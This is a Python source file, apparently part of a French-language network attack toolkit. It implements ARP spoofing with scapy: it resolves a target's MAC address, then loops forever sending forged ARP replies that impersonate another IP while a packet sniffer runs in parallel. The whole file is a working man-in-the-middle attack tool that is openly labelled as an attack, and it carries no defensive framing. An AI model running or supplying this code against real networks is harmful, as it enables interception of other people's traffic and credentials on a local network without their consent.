# ==== [arp_spoof.py] ====
from scapy.all import ARP, Ether, sendp, srp
import time, threading, os
from core.storage import results
from sniffer.live_sniffer import start_sniffing, stop_sniffing

spoof_count = 0

def get_mac(ip):
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=2, verbose=0)
    for sent, received in ans:
        return received.hwsrc
    return None

def spoof(target_ip, spoof_ip, target_mac):
    global spoof_count
    ether = Ether(dst=target_mac)
    arp = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    packet = ether / arp
    sendp(packet, verbose=0)
    spoof_count += 1
    print(f"[{spoof_count:02d}] ➔ ARP Spoof envoyé vers {target_ip} (usurpant {spoof_ip})")

def launch_arp_spoof(target_ip, spoof_ip, target_mac=None):
    if os.geteuid() != 0:
        print("[✘] Permission root requise.")
        return

    if not target_mac:
        print("[~] Résolution de l'adresse MAC de la cible …")
        target_mac = get_mac(target_ip)
        if not target_mac:
            print("[✘] Impossible de résoudre l'adresse MAC de la cible.")
            return
        print(f"[✓] MAC de la cible: {target_mac}")

    print("\n💉 Lancement de l'attaque ARP Spoofing:")
    print(f"   ➔ IP cible       : {target_ip}")
    print(f"   ➔ IP usurpée     : {spoof_ip}")
    print(f"   ➔ MAC de la cible: {target_mac}\n")

    results["spoof"].append(f"Début ARP spoof entre {spoof_ip} et {target_ip}")

    print("[*] Démarrage du sniffer réseau en parallèle...")
    sniffer_thread = threading.Thread(target=start_sniffing)
    sniffer_thread.daemon = True
    sniffer_thread.start()

    try:
        while True:
            spoof(target_ip, spoof_ip, target_mac)
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[!] Spoofing interrompu par l'utilisateur (Ctrl+C).")
        results["spoof"].append(f"ARP spoof interrompu. Total paquets spoofés: {spoof_count}")
        print(f"[✔] Total des paquets ARP envoyés : {spoof_count}")
        print("[ℹ️] Arrêt du sniffer...")
        stop_sniffing()
